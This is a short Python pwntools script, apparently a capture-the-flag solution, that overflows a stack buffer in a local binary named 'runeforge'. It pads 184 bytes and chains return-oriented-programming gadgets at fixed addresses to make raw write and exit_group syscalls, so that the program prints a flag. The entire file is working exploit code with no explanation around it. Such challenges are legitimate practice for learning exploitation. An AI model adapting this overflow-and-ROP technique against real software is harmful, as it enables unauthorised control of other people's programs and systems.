#!/usr/bin/env python3

from pwn import *

context.binary = "./runeforge"
context.arch = "amd64"

io = process("./runeforge")

OFFSET = 184

POP_RAX      = 0x4D7037
DEREF_RAX    = 0x460945
MOV_RDX_RAX  = 0x4884E5
MOV_RSI_RAX  = 0x41558F
POP_RDI      = 0x496B1E
SYSCALL      = 0x466769

FLAG_DATA = 0x626570
FLAG_LEN  = 0x626578

payload = b"A" * OFFSET

payload += flat(
    # RDX = *(FLAG_LEN)
    POP_RAX,
    FLAG_LEN,
    DEREF_RAX,
    MOV_RDX_RAX,
    0,
    0,
    0,

    # RSI = *(FLAG_DATA)
    POP_RAX,
    FLAG_DATA,
    DEREF_RAX,
    MOV_RSI_RAX,

    # write(1, RSI, RDX)
    POP_RDI,
    1,
    POP_RAX,
    1,
    SYSCALL,

    # exit_group(0)
    POP_RDI,
    0,
    POP_RAX,
    231,
    SYSCALL,
)

io.sendlineafter(b"Choice:", b"1")
io.sendlineafter(b"Forge:", payload)

print(io.recvall(timeout=2).decode(errors="ignore"))
